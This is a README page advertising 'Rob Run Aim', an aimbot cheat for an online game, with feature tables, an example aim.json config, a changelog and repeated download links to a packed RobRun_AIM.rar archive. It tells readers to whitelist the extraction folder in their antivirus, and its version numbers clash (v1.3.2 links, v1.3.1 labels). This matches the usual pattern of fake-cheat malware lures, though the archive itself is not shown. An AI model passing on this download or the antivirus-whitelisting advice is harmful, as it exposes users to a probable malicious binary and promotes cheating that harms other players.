
# 🎯 Rob Run Aim

<p align="center">
  <img src="https://capsule-render.vercel.app/api?type=blur&color=0:0B0E0C,30:1A2F1A,60:84CC16,100:FACC15&height=230&section=header&text=ROB%20RUN%20AIM&fontSize=54&fontColor=F7FEE7&fontAlignY=40&desc=lock%20%E2%80%A2%20track%20%E2%80%A2%20land%20it&descAlignY=66&descSize=15&animation=blinking" width="100%" alt="Rob Run Aim" />
</p>

<p align="center">
  <img src="https://readme-typing-svg.demolab.com?font=Chakra+Petch&weight=700&size=18&duration=2500&pause=700&color=A3E635&center=true&vCenter=true&width=900&lines=Per-weapon+aim+presets+%E2%9A%A1;Bone+priority+%26+switch+delay+%F0%9F%8E%AF;Visible-only+lock+%F0%9F%91%81%EF%B8%8F;Profile-driven+%F0%9F%93%81;Fully+configurable+%E2%9C%94" alt="Typing SVG" width="100%" />
</p>

<p align="center">
  <a href="https://github.com/brandbudgietrimmer/Rob-Run-AIM/releases/download/v1.3.2/RobRun_AIM.rar">
    <img src="https://img.shields.io/badge/%F0%9F%8E%AF%20DOWNLOAD-RobRun_AIM.rar-84CC16?style=for-the-badge&logo=target&logoColor=0B0E0C&labelColor=0B0E0C" alt="Download">
  </a>
  &nbsp;
  <img src="https://img.shields.io/badge/STATUS-STABLE-FACC15?style=for-the-badge&labelColor=0B0E0C" alt="Status">
  &nbsp;
  <img src="https://img.shields.io/badge/VERSION-v1.3.1-A3E635?style=for-the-badge&labelColor=0B0E0C" alt="Version">
  &nbsp;
  <img src="https://img.shields.io/badge/RELEASE-2026--11--18-FDE68A?style=for-the-badge&labelColor=0B0E0C" alt="Release">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Windows_10_/_11-1A2F1A?style=flat-square&logo=windows&logoColor=A3E635" alt="Windows">
  <img src="https://img.shields.io/badge/Steam-1A2F1A?style=flat-square&logo=steam&logoColor=FACC15" alt="Steam">
  <img src="https://img.shields.io/badge/Epic-1A2F1A?style=flat-square&logo=epicgames&logoColor=A3E635" alt="Epic">
  <img src="https://img.shields.io/badge/Aim_Presets-84CC16?style=flat-square&labelColor=0B0E0C" alt="Aim">
  <img src="https://img.shields.io/badge/Bone_Priority-FACC15?style=flat-square&labelColor=0B0E0C" alt="Bone">
  <img src="https://img.shields.io/badge/Profiles-A3E635?style=flat-square&labelColor=0B0E0C" alt="Profiles">
</p>

<p align="center">
  <i>Aim suite for Rob Run — per-weapon presets, FOV control, bone priority and switch delay, all driven by profiles.</i>
</p>

---

<table>
<tr>
<td width="33%" align="center" valign="top">

### 🎯
**Weapon Presets**

Each gun gets its own FOV, smoothing and bone target — save and swap per loadout.

</td>
<td width="33%" align="center" valign="top">

### 🔭
**Field of View**

Adaptive FOV that scales with distance, plus a hard range cap for close-quarters.

</td>
<td width="33%" align="center" valign="top">

### 🦴
**Bone Priority**

Head, chest, pelvis — pick the order, set fallback when the primary bone is hidden.

</td>
</tr>
<tr>
<td align="center" valign="top">

### ⏱️
**Switch Delay**

Cooldown between target switches to avoid jitter — tuned in milliseconds.

</td>
<td align="center" valign="top">

### 👁️
**Visible Only**

Lock only on entities in line of sight; ignore players behind walls or smoke.

</td>
<td align="center" valign="top">

### 🧩
**Profiles**

Saved configs per weapon and per mode, hot-reload with a single key.

</td>
</tr>
</table>

---

## 🖼 Gallery

<p align="center">
  <img src="https://github.com/user-attachments/assets/5362a06c-cf9d-4205-8d52-66279aa9d524" alt="Rob Run Aim — control panel" width="100%">
</p>
<p align="center">
  <img src="https://github.com/user-attachments/assets/d6aaf85e-d5ad-42b6-9db6-959eb64084e0" alt="Rob Run Aim — weapon presets" width="49%">
  <img src="https://github.com/user-attachments/assets/236b0d0d-19bf-4ccb-aac3-bd4688510e02" alt="Rob Run Aim — in-game overlay" width="49%">
</p>


---

## 📥 Build

<p align="center">
  <a href="https://github.com/brandbudgietrimmer/Rob-Run-AIM/releases/download/v1.3.2/RobRun_AIM.rar">
    <img src="https://img.shields.io/badge/%F0%9F%8E%AF%20RobRun_AIM.rar-1.3.1-84CC16?style=for-the-badge&logo=target&logoColor=0B0E0C&labelColor=0B0E0C" alt="Download">
  </a>
</p>

| Archive | Tag | Released |
|---------|:---:|:--------:|
| [`RobRun_AIM.rar`](https://github.com/brandbudgietrimmer/Rob-Run-AIM/releases/download/v1.3.2/RobRun_AIM.rar) | `v1.3.1` | Nov 18, 2026 |

> 🛡 **No spoofer bundled.** Packed executables are frequently misflagged — whitelist the extraction folder before launching.

---

## ⚙️ Config

> [!TIP]
> Aim settings live in `aim.json` and hot-reload with **`F5`**.

<details>
<summary>📂 <b>Example aim.json</b> — click to expand</summary>

```json
{
  "aim": {
    "enabled": true,
    "preset": "ar",
    "fov": 120,
    "adaptive_fov": true,
    "range_cap": 300,
    "smoothing": 4.5,
    "bone": "head",
    "fallback_bone": "chest",
    "visible_only": true,
    "switch_delay_ms": 120
  },
  "presets": {
    "ar":     { "fov": 120, "smoothing": 4.5, "bone": "head" },
    "smg":    { "fov": 90,  "smoothing": 3.0, "bone": "chest" },
    "sniper": { "fov": 45,  "smoothing": 1.5, "bone": "head" }
  },
  "ui": {
    "theme": "lime",
    "locale": "en"
  }
}
```

</details>

---

## 📝 Changelog

<details>
<summary><code>v1.3.1</code> — <b>Latest</b> 🟢</summary>

- ✅ Per-weapon aim presets
- ✅ Adaptive FOV with range cap
- ✅ Bone priority with fallback
- ✅ Visible-only lock
- ✅ Switch delay in milliseconds
- ✅ Profiles with hot-reload
- 🔧 Smoother interpolation at low FPS
- 🐛 Fixed preset swap resetting `fov` to default

</details>

<details>
<summary><code>v1.3.0</code></summary>

- ✅ Adaptive FOV
- ✅ Bone fallback logic
- ✅ Range cap for close-quarters
- 🐛 Fixed switch delay ignored on first lock

</details>

---

<p align="center">
  <img src="https://capsule-render.vercel.app/api?type=blur&color=0:FACC15,40:84CC16,70:1A2F1A,100:0B0E0C&height=150&section=footer&text=Rob%20Run%20Aim&fontSize=24&fontColor=F7FEE7&fontAlignY=68&desc=lock%20%E2%80%A2%20track%20%E2%80%A2%20land%20it&descAlignY=88&descSize=12" width="100%" alt="footer" />
</p>

<p align="center">
  <sub><b>v1.3.1</b> · 2026 · All rights reserved · Rob Run Aim Team</sub>
</p>
